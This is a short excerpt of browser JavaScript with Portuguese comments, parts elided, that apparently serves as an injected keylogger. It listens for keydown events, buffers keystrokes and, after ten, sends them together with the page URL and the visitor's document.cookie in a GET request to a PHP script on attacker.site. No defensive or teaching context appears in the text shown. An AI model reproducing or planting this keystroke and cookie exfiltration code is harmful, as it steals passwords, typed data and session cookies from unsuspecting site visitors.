...
document.addEventListener("keydown",function(e){
	...
	if (teclas.length >= 10){ //Caso array for maior ou igual a 10 caracteres
		...
		xhttp.open("GET", "https://attacker.site/strokes.php?key="+teclas.join("")+"&url="+window.location.href+"&cookie="+document.cookie, true); //Envia GET para servidor com PHP que registra teclas
